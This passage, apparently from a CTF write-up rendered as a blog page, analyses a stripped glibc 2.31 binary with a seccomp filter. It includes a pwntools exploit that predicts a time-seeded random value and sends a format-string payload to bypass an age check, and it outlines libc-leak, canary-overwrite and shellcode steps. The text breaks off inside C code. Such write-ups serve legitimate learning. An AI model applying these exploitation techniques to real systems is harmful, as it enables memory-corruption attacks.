@@ -1,0 +1,605 @@
+I"M<h2 id="tldr">tl;dr</h2>
+
+<ul>
+  <li>Use format String to get into secret service.</li>
+  <li>Get libc leaks by overwriting mapped bit of a free chunk.</li>
+  <li>Overwrite the Thread Local Block , thus overwriting canary to get buffer overflow.</li>
+</ul>
+
+<p><strong>Challenge Points :</strong> 996</p>
+
+<p><strong>No of Solves :</strong> 4</p>
+
+<h2 id="challenge-description">Challenge Description</h2>
+
+<p><code class="language-plaintext highlighter-rouge">There is a secret service hidden in the depths of the binary. Get into it,  use/hack it to your own needs and don't forget to leave a feedback :P.</code></p>
+
+<p><a href="https://drive.google.com/file/d/1E4mXspk2zpwOmBj1dVHKu5ibvP9sRx6V/view?usp=sharing">Here</a> are the Challenge files.</p>
+
+<h2 id="analysis-of-the-challenge-binary">Analysis Of The Challenge Binary</h2>
+
+<p>The binary is standard <em>x86 64-bit Dynamic stripped</em> executable. Additionally , <strong>glibc 2.31</strong> , the loader and <strong>libseccomp</strong> has been provided so that there are no heap mismatches later.</p>
+
+<p>Here’s the output of checksec -</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+
+</code></pre></div></div>
+
+<p>Here’s the seccomp dump.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+<span class="o">=================================</span>
+ <span class="mi">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+ <span class="mi">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x1f</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mi">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0005</span>
+ <span class="mi">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x1c</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x1a</span> <span class="mh">0x00</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">close</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0006</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x19</span> <span class="mh">0x00</span> <span class="mh">0x00000005</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">fstat</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0007</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x18</span> <span class="mh">0x00</span> <span class="mh">0x00000009</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">mmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0008</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x17</span> <span class="mh">0x00</span> <span class="mh">0x0000000a</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">mprotect</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0009</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x16</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0010</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x00000014</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">writev</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0011</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x14</span> <span class="mh">0x00</span> <span class="mh">0x00000020</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">dup</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0012</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x13</span> <span class="mh">0x00</span> <span class="mh">0x00000021</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">dup2</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0013</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x12</span> <span class="mh">0x00</span> <span class="mh">0x00000023</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">nanosleep</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0014</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x11</span> <span class="mh">0x00</span> <span class="mh">0x00000025</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">alarm</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0015</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x10</span> <span class="mh">0x00</span> <span class="mh">0x00000038</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">clone</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0016</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x0f</span> <span class="mh">0x00</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="nb">exit</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0017</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x0e</span> <span class="mh">0x00</span> <span class="mh">0x00000048</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">fcntl</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0018</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x0d</span> <span class="mh">0x00</span> <span class="mh">0x000000e6</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">clock_nanosleep</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0019</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x0c</span> <span class="mh">0x00</span> <span class="mh">0x000000e7</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">exit_group</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0020</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x0b</span> <span class="mh">0x00</span> <span class="mh">0x00000101</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">openat</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0021</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x0a</span> <span class="mh">0x00</span> <span class="mh">0x00000111</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">set_robust_list</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span>
+ <span class="mi">0022</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x04</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">read</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0027</span>
+ <span class="mi">0023</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000014</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="c1"># read(fd, buf, count)
+</span> <span class="mi">0024</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x08</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0025</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000010</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">fd</span> <span class="c1"># read(fd, buf, count)
+</span> <span class="mi">0026</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x06</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0032</span> <span class="k">else</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0027</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x05</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">write</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0028</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000014</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="c1"># write(fd, buf, count)
+</span> <span class="mi">0029</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x03</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0030</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000010</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">fd</span> <span class="c1"># write(fd, buf, count)
+</span> <span class="mi">0031</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0x1</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0033</span>
+ <span class="mi">0032</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mi">0033</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+
+</code></pre></div></div>
+
+<p>A few syscalls among openat , read and write have been left open intending for an <strong>orw</strong> shellcode in the end. But , there are seccomp contraints which let you read only from fd <strong>0</strong> and write only to fd <strong>1</strong>. There are simple ways to pass them which we’ll see towards the end of this post.</p>
+
+<h2 id="reversing-and-exploit-development">Reversing And Exploit Development</h2>
+
+<p>The binary initially asks for a <code class="language-plaintext highlighter-rouge">name</code> and an unsigned int <code class="language-plaintext highlighter-rouge">Age</code>. Before all this , it initially <code class="language-plaintext highlighter-rouge">mmaps</code> a writeable region and then calls a function which generates a random 2 byte constraint.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">get_rand</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">region</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">time_t</span> <span class="n">toc</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">tic</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">toc</span><span class="p">),</span><span class="n">end_t</span><span class="p">;</span>
+    <span class="k">do</span><span class="p">{</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">tic</span><span class="o">/</span><span class="mi">60</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">lower</span> <span class="o">=</span> <span class="mh">0x1000</span> <span class="p">,</span> <span class="n">upper</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">rand_num</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="p">(</span><span class="n">upper</span><span class="o">-</span><span class="n">lower</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="n">lower</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">delay</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">300</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">end_t</span> <span class="o">=</span> <span class="n">tic</span> <span class="o">+</span> <span class="n">delay</span><span class="p">;</span>
+    <span class="n">tic</span> <span class="o">=</span> <span class="n">tic</span> <span class="o">+</span> <span class="n">delay</span><span class="p">;</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">end_t</span><span class="o">/</span><span class="mi">30</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">rand_num_2</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="p">(</span><span class="n">upper</span><span class="o">-</span><span class="n">lower</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="n">lower</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">region</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">region</span><span class="p">,</span><span class="o">&amp;</span><span class="n">rand_num_2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">region</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">rand_num</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">region</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">);</span>
+    <span class="n">MProtect</span><span class="p">(</span><span class="n">region</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>We create a random 2 byte vulnerable contraint.</p>
+
+<p>Finally the mmaped region is mprotected to be <code class="language-plaintext highlighter-rouge">read-only</code>.</p>
+
+<p>Later on , the age is verified with the 2 byte contraint which has to be satisfied by the format string vulnerability.</p>
+
+<h3 id="an-unintended-flaw">An Unintended Flaw</h3>
+
+<p>The only thing I forgot to do was add a check to age (&lt; 0x900) , so that only format string can be used to bypass the check to enter the secret service.</p>
+
+<p class="notice">But since I didn’t add a check,  the format string is rendered <strong>useless</strong> as participants can directly calculate the age from the library using <strong>ctypes</strong> or plain python and give that as age :(.</p>
+
+<p>But now I’d like to discuss how you could do it the intended way using format string.</p>
+
+<p>Well , I’ve included the fixed binary in the handout folder and now u can try the challenges without any unintended flaws :).</p>
+
+<h3 id="the-intended-way-to-get-into-the-secret-service">The Intended Way To Get Into The Secret Service</h3>
+
+<p>Here’s the exploit snippet which mimics the 2 byte contraint.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'35.245.143.0'</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">7777</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">,</span><span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">noptrace</span><span class="o">=</span><span class="bp">True</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./chall'</span><span class="p">)</span>
+
+<span class="n">reu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">rel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">re</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+
+<span class="c1">#Defining functions for various heap operations
+</span>
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Index : "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"size : "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s">"details -&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Candidate: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">hack</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="s">'2020'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Candidate: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Candidate: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">move_on</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="s">'4'</span><span class="p">)</span>
+
+<span class="c1">#Mimicing the random function implemented by binary to break it
+</span><span class="k">def</span> <span class="nf">get_rand</span><span class="p">():</span>
+    <span class="n">toc</span> <span class="o">=</span> <span class="n">c_long</span><span class="p">()</span>
+    <span class="n">tic</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="n">byref</span><span class="p">(</span><span class="n">toc</span><span class="p">))</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">tic</span><span class="o">/</span><span class="mi">60</span><span class="p">)</span>
+        <span class="n">lower</span> <span class="o">=</span> <span class="mh">0x1000</span>
+        <span class="n">upper</span> <span class="o">=</span> <span class="mh">0xffff</span>
+        <span class="n">rand_num</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="p">(</span><span class="n">upper</span><span class="o">-</span><span class="n">lower</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">lower</span>
+        <span class="n">delay</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">300</span> <span class="o">+</span> <span class="mi">1</span>
+        <span class="n">end_time</span> <span class="o">=</span> <span class="n">tic</span> <span class="o">+</span> <span class="n">delay</span>
+        <span class="n">tic</span> <span class="o">=</span> <span class="n">tic</span> <span class="o">+</span> <span class="n">delay</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">end_time</span><span class="o">/</span><span class="mi">30</span><span class="p">)</span>
+        <span class="n">rand_num_2</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="p">(</span><span class="n">upper</span><span class="o">-</span><span class="n">lower</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">lower</span>
+        <span class="n">region</span> <span class="o">=</span> <span class="n">rand_num</span> <span class="o">&amp;</span> <span class="n">rand_num_2</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">region</span><span class="o">&gt;</span><span class="mh">0x1000</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">region</span>
+
+</code></pre></div></div>
+
+<p>Now that we have calculated the age , we need to somehow overwrite the age pointer with this so that we pass the check.</p>
+
+<h3 id="triggering-the-format-string-bug">Triggering The Format String Bug</h3>
+
+<p>You can think of directly overwriting the age pointer with the afore calculated random number , but the issue is , I had added checks for directly not allowing numbers greater than <code class="language-plaintext highlighter-rouge">0x900</code> to be present in the input string.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//%n is allowed in format string , but u cant write large numbers (greater than 0x900) with %n</span>
+<span class="kt">void</span> <span class="nf">check_num</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">)</span> 
+    <span class="p">{</span> 
+        <span class="k">if</span> <span class="p">(</span> <span class="n">isdigit</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">))</span> 
+        <span class="p">{</span>
+            <span class="kt">long</span> <span class="n">val</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> 
+            <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">&gt;</span><span class="mh">0x900</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Not allowed"</span><span class="p">);</span>
+                <span class="n">Exit</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span> 
+        <span class="k">else</span>
+            <span class="n">p</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>So it only leaves us with the solution of writing the random number on stack and then copying it from there to the age pointer.</p>
+
+<p class="notice">We can copy numbers from stack using <code class="language-plaintext highlighter-rouge">%*offset$d</code>. Let’s use it in our exploit.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="n">region</span> <span class="o">=</span> <span class="n">get_rand</span><span class="p">()</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"region = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">region</span><span class="p">))</span>
+    <span class="c1">#Using format string to pass the initial check , to enter the secret_service
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">'%*18$d'</span> <span class="o">+</span> <span class="s">'%15$n'</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">region</span><span class="p">)</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Age: "</span><span class="p">,</span><span class="s">"123"</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+
+<p>With this , we satisfy all checks and enter the secret service.</p>
+
+<p>The secret service is pretty much a commonplace menu driven code with <code class="language-plaintext highlighter-rouge">Enroll</code> , <code class="language-plaintext highlighter-rouge">View</code> , <code class="language-plaintext highlighter-rouge">Remove</code> and an extra functionality which I termed as <code class="language-plaintext highlighter-rouge">Hack</code>. Later on , a feedback is requested which initialises a separate thread to do stuff.</p>
+
+<p>But why so much obfuscation just to take a feedback , there’s a reason for that guys, hold your horses.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">secret_service</span><span class="p">()</span>
+<span class="p">{</span>
+    
+    <span class="n">pthread_t</span> <span class="n">t1</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">option</span> <span class="o">=</span> <span class="n">menu</span><span class="p">();</span>
+        <span class="k">switch</span><span class="p">(</span><span class="n">option</span><span class="p">)</span>
+        <span class="p">{</span> 
+            <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Enroll</span><span class="p">();</span>
+            <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="n">View</span><span class="p">();</span>
+            <span class="k">break</span><span class="p">;</span>
